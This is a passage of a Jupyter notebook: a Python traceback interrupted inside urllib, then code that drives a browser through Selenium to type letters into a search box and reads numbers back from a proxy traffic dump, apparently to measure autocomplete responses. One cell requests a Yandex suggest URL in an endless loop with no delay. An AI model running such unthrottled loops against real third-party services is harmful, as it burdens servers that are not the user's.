      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/urllib/request.py\u001b[0m in \u001b[0;36mhttps_open\u001b[0;34m(self, req)\u001b[0m\n\u001b[1;32m   1359\u001b[0m         \u001b[0;32mdef\u001b[0m \u001b[0mhttps_open\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mreq\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1360\u001b[0m             return self.do_open(http.client.HTTPSConnection, req,\n\u001b[0;32m-> 1361\u001b[0;31m                 context=self._context, check_hostname=self._check_hostname)\n\u001b[0m\u001b[1;32m   1362\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1363\u001b[0m         \u001b[0mhttps_request\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mAbstractHTTPHandler\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdo_request_\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/urllib/request.py\u001b[0m in \u001b[0;36mdo_open\u001b[0;34m(self, http_class, req, **http_conn_args)\u001b[0m\n\u001b[1;32m   1319\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mOSError\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0merr\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;31m# timeout error\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1320\u001b[0m                 \u001b[0;32mraise\u001b[0m \u001b[0mURLError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1321\u001b[0;31m             \u001b[0mr\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mh\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetresponse\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1322\u001b[0m         \u001b[0;32mexcept\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1323\u001b[0m             \u001b[0mh\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/http/client.py\u001b[0m in \u001b[0;36mgetresponse\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m   1329\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1330\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1331\u001b[0;31m                 \u001b[0mresponse\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbegin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1332\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mConnectionError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1333\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/http/client.py\u001b[0m in \u001b[0;36mbegin\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    295\u001b[0m         \u001b[0;31m# read until we get a non-100 response\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    296\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 297\u001b[0;31m             \u001b[0mversion\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstatus\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mreason\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_read_status\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    298\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mstatus\u001b[0m \u001b[0;34m!=\u001b[0m \u001b[0mCONTINUE\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    299\u001b[0m                 \u001b[0;32mbreak\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/http/client.py\u001b[0m in \u001b[0;36m_read_status\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    256\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    257\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_read_status\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 258\u001b[0;31m         \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreadline\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0m_MAXLINE\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"iso-8859-1\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    259\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m>\u001b[0m \u001b[0m_MAXLINE\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    260\u001b[0m             \u001b[0;32mraise\u001b[0m \u001b[0mLineTooLong\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"status line\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/socket.py\u001b[0m in \u001b[0;36mreadinto\u001b[0;34m(self, b)\u001b[0m\n\u001b[1;32m    584\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    585\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 586\u001b[0;31m                 \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_sock\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv_into\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mb\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    587\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    588\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_timeout_occurred\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/ssl.py\u001b[0m in \u001b[0;36mrecv_into\u001b[0;34m(self, buffer, nbytes, flags)\u001b[0m\n\u001b[1;32m   1000\u001b[0m                   \u001b[0;34m\"non-zero flags not allowed in calls to recv_into() on %s\"\u001b[0m \u001b[0;34m%\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1001\u001b[0m                   self.__class__)\n\u001b[0;32m-> 1002\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mnbytes\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mbuffer\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1003\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1004\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv_into\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mbuffer\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mnbytes\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mflags\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/ssl.py\u001b[0m in \u001b[0;36mread\u001b[0;34m(self, len, buffer)\u001b[0m\n\u001b[1;32m    863\u001b[0m             \u001b[0;32mraise\u001b[0m \u001b[0mValueError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Read on closed or unwrapped SSL socket.\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    864\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 865\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_sslobj\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mbuffer\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    866\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mSSLError\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mx\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    867\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mx\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0mSSL_ERROR_EOF\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msuppress_ragged_eofs\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/ssl.py\u001b[0m in \u001b[0;36mread\u001b[0;34m(self, len, buffer)\u001b[0m\n\u001b[1;32m    623\u001b[0m         \"\"\"\n\u001b[1;32m    624\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mbuffer\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 625\u001b[0;31m             \u001b[0mv\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_sslobj\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mbuffer\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    626\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    627\u001b[0m             \u001b[0mv\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_sslobj\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "while(True):\n",
    "    urllib.request.urlopen(\"https://yandex.com/suggest-spok/suggest-ya.cgi?callback=jQuery18307090935306396142_1490678571367&srv=morda_com_desktop&wiz=TrWth&uil=en&fact=1&v=4&icon=1&hl=1&html=1&n=5&bemjson=1&yu=9364118791490678570&pos=1&part=a\", context=context)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def enterAllAlphabet2(inputElement):\n",
    "    deleteContent('sadu123.txt')\n",
    "    alphabet=list(string.ascii_lowercase)\n",
    "    popup_css='div.popup_visibility_visible'\n",
    "    for c in alphabet:\n",
    "        success=False\n",
    "        while(not success):\n",
    "            try:\n",
    "                inputElement.send_keys(c)\n",
    "                element_present = EC.presence_of_element_located((By.CSS_SELECTOR, popup_css))\n",
    "                WebDriverWait(driver,1).until(element_present)\n",
    "                time.sleep(0.1)\n",
    "                success=True\n",
    "                print(True)\n",
    "            except TimeoutException:\n",
    "                inputElement.send_keys(Keys.BACKSPACE)\n",
    "                #element_absence=EC.invisibility_of_element_located((By.CSS_SELECTOR, popup_css))\n",
    "                #WebDriverWait(driver,1).until(element_absence)\n",
    "                success=False\n",
    "                print(False)\n",
    "\n",
    "        inputElement.send_keys(Keys.BACKSPACE)\n",
    "        time.sleep(0.1)\n",
    "        #element_absence=EC.invisibility_of_element_located((By.CSS_SELECTOR, popup_css))\n",
    "        #WebDriverWait(driver,1).until(element_absence)\n",
    "            \n",
    "#         bs=Keys.BACKSPACE\n",
    "#         time.sleep(0.2)\n",
    "#         inputElement.send_keys(bs)\n",
    "#         time.sleep(0.2)\n",
    "    #ts2.join()\n",
    "    time.sleep(3)\n",
    "    T2=readProxyDump('sadu123.txt')\n",
    "    return list(map(int,T2))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
